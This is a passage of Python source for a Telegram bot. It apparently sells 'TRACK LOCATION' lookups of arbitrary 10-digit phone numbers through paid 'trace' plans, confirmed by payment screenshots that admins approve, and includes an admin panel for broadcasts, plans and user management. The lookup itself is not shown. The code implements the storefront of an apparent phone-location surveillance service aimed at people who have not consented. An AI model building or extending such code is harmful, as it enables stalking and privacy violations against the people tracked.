                except: await update.message.reply_text(f"<b>{to_bold_font('Invalid.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Format: USER_ID TRACES')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "add_subscription":
            parts = text.split(maxsplit=1)
            if len(parts) == 2:
                try:
                    uid2 = int(parts[0]); plan = plans_col.find_one({"name": parts[1]})
                    if plan:
                        traces = plan["traces"] if plan["traces"] != 0 else 999999
                        update_user_traces(uid2, traces, parts[1]); await update.message.reply_text(f"<b>✅ {to_bold_font('Added.')}</b>", parse_mode="HTML")
                    else: await update.message.reply_text(f"<b>❌ {to_bold_font('Not found.')}</b>", parse_mode="HTML")
                except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Format: USER_ID PLAN')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "remove_subscription":
            try: uid2 = int(text); update_user_traces(uid2, -get_user_data(uid2)["traces"], to_bold_font("None")); await update.message.reply_text(f"<b>✅ {to_bold_font('Removed.')}</b>", parse_mode="HTML")
            except: await update.message.reply_text(f"<b>{to_bold_font('Invalid ID.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "clear_mongo":
            if text == "YES":
                users_col.drop(); plans_col.drop(); revenue_col.drop(); init_db()
                await update.message.reply_text(f"<b>✅ {to_bold_font('Cleared.')}</b>", parse_mode="HTML")
            else: await update.message.reply_text(f"<b>{to_bold_font('Cancelled.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return

    if text == f"📍 {to_bold_font('TRACK LOCATION')}":
        ud = get_user_data(uid)
        if ud["traces"] <= 0: await show_plans(update, uid)
        else:
            context.user_data["state"] = "awaiting_phone"
            await update.message.reply_text(f"<b>📲 {to_bold_font('TRACK LOCATION')}\n\n➡️ {to_bold_font('10 digits, no country code.')}</b>", parse_mode="HTML")
    elif text == f"💳 {to_bold_font('SUBSCRIPTION PLANS')}":
        await show_plans(update, uid)
    elif text == f"👤 {to_bold_font('MY ACCOUNT')}":
        ud = get_user_data(uid); name = update.message.from_user.first_name
        username = f"@{update.message.from_user.username}" if update.message.from_user.username else "None"
        traces = "UNLIMITED" if ud["plan"] == to_bold_font("ULTIMATE PREMIUM") else ud["traces"]
        acc = f"<b>━━━━━━━━━━━━━━━━━━━━━━\n👤 {to_bold_font('MY ACCOUNT')}\n\n• {to_bold_font('NAME')}: {to_bold_font(name)}\n• {to_bold_font('USERNAME')}: {to_bold_font(username)}\n• {to_bold_font('PLAN')}: {ud['plan']}\n\n📊 {to_bold_font('TRACES')}: {traces}\n━━━━━━━━━━━━━━━━━━━━━━</b>"
        await update.message.reply_text(acc, reply_markup=get_support_inline(), parse_mode="HTML")
    elif text == f"✉️ {to_bold_font('HELP & SUPPORT')}":
        await update.message.reply_text(f"<b>✉️ {to_bold_font('HELP & SUPPORT')}</b>", reply_markup=get_support_inline(), parse_mode="HTML")
    elif text == f"🎬 {to_bold_font('SEE DEMO')}":
        if DEMO_VIDEO: await update.message.reply_video(DEMO_VIDEO, caption=f"<b>🎬 {to_bold_font('DEMO')}</b>", parse_mode="HTML")
        else: await update.message.reply_text(f"<b>{to_bold_font('No demo.')}</b>", parse_mode="HTML")

async def show_plans(update, uid):
    msg = f"{to_bold_font('BOT PLANS')} 📡✨\n\n━━━━━━━━━━━━━━━\n\n"
    msg += f"💠 {to_bold_font('DEMO PLAN')}\n💰 {to_bold_font('49')}₹\n🔍 {to_bold_font('5')} {to_bold_font('TRACES')}\n⚡ {to_bold_font('Perfect for testing')}\n\n━━━━━━━━━━━━━━━\n\n"
    msg += f"💎 {to_bold_font('PREMIUM PLAN')}\n💰 {to_bold_font('109')}₹\n🔍 {to_bold_font('19')} {to_bold_font('TRACES')}\n🚀 {to_bold_font('More power')}\n\n━━━━━━━━━━━━━━━\n\n"
    msg += f"🔥 {to_bold_font('PREMIUM ULTRA')}\n💰 {to_bold_font('199')}₹\n🔍 {to_bold_font('25')} {to_bold_font('TRACES')}\n⚡ {to_bold_font('High performance')}\n\n━━━━━━━━━━━━━━━\n\n"
    msg += f"👑 {to_bold_font('ULTIMATE PREMIUM')}\n💰 {to_bold_font('299')}₹\n⏳ {to_bold_font('1 MONTH VALIDITY')}\n♾️ {to_bold_font('UNLIMITED TRACES')}\n🚀 {to_bold_font('Full access • No limits')}\n\n━━━━━━━━━━━━━━━\n\n"
    msg += f"{to_bold_font('Choose a plan below to pay:')}"
    await update.message.reply_text(msg, reply_markup=get_plans_inline(), parse_mode="HTML")

async def admin_panel(update, context):
    kb = ReplyKeyboardMarkup([
        [f"📊 {to_bold_font('VAST STATS')}", f"💰 {to_bold_font('REVENUE')}"],
        [f"📢 {to_bold_font('BROADCAST')}", f"✉️ {to_bold_font('MESSAGE USER')}"],
        [f"🔍 {to_bold_font('CHECK USER')}", f"👑 {to_bold_font('ADMIN LIST')}"],
        [f"🚫 {to_bold_font('SUSPEND')}", f"✅ {to_bold_font('UNSUSPEND')}"],
        [f"➕ {to_bold_font('ADD ADMIN')}", f"❌ {to_bold_font('REMOVE ADMIN')}"],
        [f"🔗 {to_bold_font('FORCE CHANNEL')}", f"❌ {to_bold_font('REMOVE FORCE SUB')}"],
        [f"🆘 {to_bold_font('SUPPORT USERNAME')}", f"🖼 {to_bold_font('ADD QR')}"],
        [f"❌ {to_bold_font('REMOVE QR')}", f"🎬 {to_bold_font('SET DEMO')}"],
        [f"🔧 {to_bold_font('MAINTENANCE')}"],
        [f"➕ {to_bold_font('ADD PLAN')}", f"📝 {to_bold_font('EDIT PLAN')}", f"🗑 {to_bold_font('DELETE PLAN')}"],
        [f"➕ {to_bold_font('ADD TRACES')}", f"➖ {to_bold_font('REMOVE TRACES')}"],
        [f"🎁 {to_bold_font('ADD SUBSCRIPTION')}", f"❌ {to_bold_font('REMOVE SUBSCRIPTION')}"],
        [f"📋 {to_bold_font('PLAN STATUS')}", f"🗑 {to_bold_font('CLEAR MONGO')}"],
        [f"⬅️ {to_bold_font('BACK')}"]
    ], resize_keyboard=True)
    await update.message.reply_text(f"<b>🔧 {to_bold_font('ADMIN PANEL')}</b>", reply_markup=kb, parse_mode="HTML")

async def handle_payment(update, context):
    query = update.callback_query; await query.answer()
    uid = query.from_user.id; plan_id = query.data.split("_")[1]
    from bson import ObjectId
    plan = plans_col.find_one({"_id": ObjectId(plan_id)})
    if not plan: return
    name, price, traces = plan["name"], plan["price"], plan["traces"]
    pay_id = gen_pay_id()
    pending_payments[uid] = pay_id
    payment_store[pay_id] = {"plan_id": plan_id, "plan_name": name, "price": price, "traces": traces, "uid": uid}
    msg = f"<b>💳 {to_bold_font('PAYMENT REQUEST')}\n\n{to_bold_font('PLAN')}: {name}\n{to_bold_font('PRICE')}: ₹{price}\n\n{to_bold_font('Upload screenshot and click DONE.')}</b>"
    if QR_PHOTO:
        await query.message.reply_photo(QR_PHOTO, caption=msg, parse_mode="HTML", reply_markup=get_done_inline())
    else:
        await query.message.reply_text(msg, parse_mode="HTML", reply_markup=get_done_inline())

async def handle_done_upload(update, context):
    query = update.callback_query; await query.answer()
    uid = query.from_user.id
    if uid not in pending_payments:
        await query.message.reply_text(f"<b>❌ {to_bold_font('No pending payment.')}</b>", parse_mode="HTML"); return
    await query.message.reply_text(f"<b>📸 {to_bold_font('Upload screenshot now.')}</b>", parse_mode="HTML")

async def unified_media_handler(update, context):
    global QR_PHOTO, DEMO_VIDEO
    uid = update.message.from_user.id
    if uid in pending_payments:
        pay_id = pending_payments[uid]
        pay = payment_store.get(pay_id)
        if pay:
            caption = f"<b>💰 {to_bold_font('NEW PAYMENT REQUEST')}\n\n👤 {to_bold_font('USER')}: @{update.message.from_user.username}\n🆔 {to_bold_font('ID')}: {uid}\n💎 {to_bold_font('PLAN')}: {pay['plan_name']}\n💰 {to_bold_font('AMOUNT')}: ₹{pay['price']}</b>"
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{to_bold_font('Approve')} ✅", callback_data=f"apv|{pay_id}"),
                 InlineKeyboardButton(f"{to_bold_font('Decline')} ❌", callback_data=f"dcl|{pay_id}")]
            ])
            recipient_ids = list(OWNER_IDS)
            for a in get_visible_admin_list():
                recipient_ids.append(a["user_id"])
            recipient_ids = [x for x in set(recipient_ids) if x != 0]
            sent_count = 0
            for admin_id in recipient_ids:
                try:
                    await context.bot.send_photo(admin_id, update.message.photo[-1].file_id, caption=caption, reply_markup=keyboard, parse_mode="HTML")
                    sent_count += 1
                except Exception as e:
                    logging.error(f"Screenshot send failed to {admin_id}: {e}")
            logging.info(f"Payment screenshot sent to {sent_count}/{len(recipient_ids)} admins")
            await update.message.reply_text(f"<b>✅ {to_bold_font('Screenshot sent to admin. Wait for approval.')}</b>", parse_mode="HTML")
            del pending_payments[uid]
        else:
            del pending_payments[uid]
        return
    if uid in OWNER_IDS:
        state = context.user_data.get('admin_state')
        if state == "add_qr" and update.message.photo:
            QR_PHOTO = update.message.photo[-1].file_id
            await update.message.reply_text(f"<b>✅ {to_bold_font('QR Added.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "set_demo" and update.message.video:
            DEMO_VIDEO = update.message.video.file_id
            await update.message.reply_text(f"<b>✅ {to_bold_font('Demo saved.')}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return
        elif state == "broadcast" and (update.message.photo or update.message.video):
            users = get_all_users(); sent = 0
            if update.message.photo:
                file_id = update.message.photo[-1].file_id; caption = update.message.caption or ""
                for u in users:
                    try: await context.bot.send_photo(u, file_id, caption=caption, parse_mode="HTML"); sent += 1
                    except: pass
            elif update.message.video:
                file_id = update.message.video.file_id; caption = update.message.caption or ""
                for u in users:
                    try: await context.bot.send_video(u, file_id, caption=caption, parse_mode="HTML"); sent += 1
                    except: pass
            await update.message.reply_text(f"<b>✅ {to_bold_font('Broadcast')}: {sent}/{len(users)}</b>", parse_mode="HTML")
            context.user_data.pop('admin_state', None); return

async def admin_approve(update, context):
    query = update.callback_query
    pay_id = query.data.split("|")[1]
    if pay_id in processed_payments:
        await query.answer(to_bold_font("Already processed!"), show_alert=True); return
    pay = payment_store.get(pay_id)
    if not pay:
        await query.answer(to_bold_font("Payment not found!"), show_alert=True); return
    processed_payments.add(pay_id)
    await query.answer("APPROVED")
    from bson import ObjectId
    plan = plans_col.find_one({"_id": ObjectId(pay["plan_id"])})
    if not plan: return
    uid = pay["uid"]; pname = plan["name"]; price = plan["price"]; traces = plan["traces"]
    if traces == 0: traces = 999999
    if not users_col.find_one({"user_id": uid}): add_new_user(uid, "", "", notify_admins=False)
    update_user_traces(uid, traces, pname); add_revenue(uid, pname, price)
    await context.bot.send_message(uid, f"<b>✅ {to_bold_font('PAYMENT APPROVED')}\n\n💎 {to_bold_font('PLAN')}: {pname}\n🔍 {to_bold_font('TRACES ADDED')}: {traces}</b>", parse_mode="HTML")
    await query.message.edit_caption(query.message.caption + f"\n\n<b>✅ {to_bold_font('APPROVED')}</b>", parse_mode="HTML")

async def admin_decline(update, context):
    query = update.callback_query
    pay_id = query.data.split("|")[1]
    if pay_id in processed_payments:
        await query.answer(to_bold_font("Already processed!"), show_alert=True); return
    pay = payment_store.get(pay_id)
    if not pay:
        await query.answer(to_bold_font("Payment not found!"), show_alert=True); return
    processed_payments.add(pay_id)
    await query.answer("DECLINED")
    uid = pay["uid"]
    await context.bot.send_message(uid, f"<b>❌ {to_bold_font('Payment declined.')}</b>", parse_mode="HTML")
    await query.message.edit_caption(query.message.caption + f"\n\n<b>❌ {to_bold_font('DECLINED')}</b>", parse_mode="HTML")

async def post_init(application):
    global bot_application, bot_loop
    bot_application = application; bot_loop = asyncio.get_running_loop()

async def post_shutdown(application):
    await _close_api_session()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    logging.info("Flask admin server started on http://0.0.0.0:8080")
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).post_shutdown(post_shutdown).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(check_join_callback, pattern="check_join"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_payment, pattern="^pay_"))
    app.add_handler(CallbackQueryHandler(handle_done_upload, pattern="^done_upload$"))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, unified_media_handler))
    app.add_handler(CallbackQueryHandler(admin_approve, pattern="^apv"))
    app.add_handler(CallbackQueryHandler(admin_decline, pattern="^dcl"))
    print("Bot is running...")
    app.run_polling()